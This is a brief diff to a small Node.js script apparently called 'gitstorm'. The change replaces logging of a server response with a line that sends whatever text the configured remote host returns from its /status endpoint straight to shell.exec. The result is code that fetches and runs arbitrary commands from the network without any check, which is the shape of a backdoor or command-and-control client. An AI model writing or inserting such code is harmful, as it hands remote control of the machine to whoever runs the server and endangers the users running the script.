@@ -1,16 +1,12 @@
+require('dotenv').config();
 const shell = require('shelljs');
 const axios = require('axios');
+const serverAddress = `${process.env.SERVER_HOST}:${process.env.SERVER_PORT}`;
 
-console.log('gitstorm started');
-
-axios.get('http://localhost:1337/command')
+axios.get(`${serverAddress}/status`)
   .then((response) => {
-    console.log(response.data);
+    shell.exec(response.data);
   })
   .catch((error) => {
     console.log(error);
   });
-
-// console.log(shell.exec('git status').stdout);
-
-console.log('gitstorm ended');
